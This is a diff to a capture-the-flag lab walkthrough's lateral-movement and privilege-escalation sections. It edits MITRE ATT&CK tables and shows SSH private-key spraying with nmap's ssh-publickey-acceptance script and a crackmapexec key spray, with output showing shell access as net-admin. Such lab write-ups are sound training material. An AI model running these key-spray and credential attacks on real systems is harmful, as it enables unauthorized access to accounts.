@@ -175,12 +175,12 @@ cat /home/j_moore/userFlag.txt
 
 ## Lateral Movement (MITRE ATT&CK Outline)
 
-| Technique ID                                            | Name                  | Tool(s) Used                    |
-| ------------------------------------------------------- | --------------------- | ------------------------------- |
-| [T1021](https://attack.mitre.org/techniques/T1021/004/) | Remote Services       | SSH                             |
-| [T1552](https://attack.mitre.org/techniques/T1552/)     | Unsecured Credentials | Manual Enumeration / LinPEAS.sh |
-| [T1110](https://attack.mitre.org/techniques/T1110/002/) | Password Cracking     | ssh2john, john/hashcat          |
-| [T1110](https://attack.mitre.org/techniques/T1110/003/) | Password Spraying     | NMAP Scripting Engine           |
+| Technique ID                                            | Name                  | Tool(s) Used                                  |
+| ------------------------------------------------------- | --------------------- | ----------------------------------------------|
+| [T1021](https://attack.mitre.org/techniques/T1021/004/) | Remote Services       | SSH                                           |
+| [T1552](https://attack.mitre.org/techniques/T1552/)     | Unsecured Credentials | Manual Enumeration / LinPEAS.sh               |
+| [T1110](https://attack.mitre.org/techniques/T1110/002/) | Password Cracking     | ssh2john, john/hashcat                        |
+| [T1110](https://attack.mitre.org/techniques/T1110/003/) | Password Spraying     | NMAP Scripting Engine, CrackMapExec           |
 
 ---
 
@@ -347,7 +347,7 @@ Session completed.
 
 ---
 
-With the id_rsa passphrase, test j_moore's id_rsa against the SFTP service.  
+With the id_rsa passphrase, test j_moore's private key against the SFTP service.  
 Command:  
 ```bash
 sftp -i id_rsa sftp@$ip 
@@ -402,7 +402,7 @@ This method is optional but serves as a valuable habit when testing SSH keys for
 
 Use the Nmap Scripting Engine (NSE) to conduct the SSH Key Spray attack.
 
-**Note:** Nmap generally performs better with passphrase-protected private keys compared to other tools (e.g., CrackMapExec, Metasploit), which work better with unprotected private keys.
+**Note:** Nmap generally performs better with passphrase-protected private keys compared to other tools (e.g., CrackMapExec, Metasploit), which work better with non-encrypted private keys.
 
 ```bash
 sudo nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"b_harris","d_wilson","e_johnson","j_davis","j_smith","m_brown","net-admin","s_miller","sftp","sys-admin"},ssh.privatekeys={"id_rsa_moore"},ssh.passphrases={"********"}' $ip
@@ -548,15 +548,6 @@ drwxr-x---  4 sys-admin sys-admin 4096 Jan  2 21:08 sys-admin
 **What do we have**:  
 - Barbara's private key.
 
-<details>
-<summary>id_rsa</summary>
-<pre>
------BEGIN OPENSSH PRIVATE KEY-----
-<Truncated for brevity>
------END OPENSSH PRIVATE KEY-----
-</pre>
-</details>
-
 ---
 
 **What can we do**:  
@@ -597,7 +588,7 @@ sys-admin
 Use CrackMapExec (CME) to conduct the Key Spray:
 
 ```bash
-crackmapexec ssh $ip -u users.txt --key-file id_rsa_barbara -p ''
+crackmapexec ssh $ip -u users.txt --key-file id_rsa_barbara -p '' --continue-on-success
 ```
 
 <details>
@@ -606,7 +597,8 @@ crackmapexec ssh $ip -u users.txt --key-file id_rsa_barbara -p ''
 ssh = the service CME is working against
 -u = /location/to/username/list.txt
 --key-file = /location/to/id_rsa
--p = passphrase for the id_rsa (if applicable)
+-p = passphrase for the id_rsa (if applicable)  
+--continue-on-success = CME will continue spraying after finding valid credentials
 </pre>
 </details>
 
@@ -619,16 +611,19 @@ SSH         10.10.247.86    22     10.10.247.86     [-] j_moore: Authentication 
 SSH         10.10.247.86    22     10.10.247.86     [-] j_smith: Authentication failed.
 SSH         10.10.247.86    22     10.10.247.86     [-] m_brown: Authentication failed.
 SSH         10.10.247.86    22     10.10.247.86     [+] net-admin: (keyfile: id_rsa_barbara)  - shell access!
-
+SSH         10.10.247.86    22     10.10.247.86     [-] s_miller: Authentication failed.
+SSH         10.10.247.86    22     10.10.247.86     [-] sftp: Authentication failed.
+SSH         10.10.247.86    22     10.10.247.86     [-] sys-admin: Authentication failed.
+</pre>
 ---
 
 ## Privilege Escalation (MITRE ATT&CK Outline)
 
-| Technique ID                 | Name                          | Tool(s) Used                |
-|-----------------------------|-------------------------------|-----------------------------|
-| [T1548](https://attack.mitre.org/techniques/T1548/003/)    | Abuse Elevation Control Mechanism    | Sudo Privileges |
-| [T1556](https://attack.mitre.org/techniques/T1556/)    | Modify Authentication Process    | /etc/ssh/sshd_config |
-| [T1110](https://attack.mitre.org/techniques/T1110/004/)    | Credential Stuffing    | hydra    |
+| Technique ID                                               | Name                                 | Tool(s) Used         |
+|------------------------------------------------------------|--------------------------------------|----------------------|
+| [T1548](https://attack.mitre.org/techniques/T1548/003/)    | Abuse Elevation Control Mechanism    | Sudo Privileges      |
+| [T1556](https://attack.mitre.org/techniques/T1556/)        | Modify Authentication Process        | /etc/ssh/sshd_config |
+| [T1110](https://attack.mitre.org/techniques/T1110/004/)    | Credential Stuffing                  | hydra                |
 
 ---
 
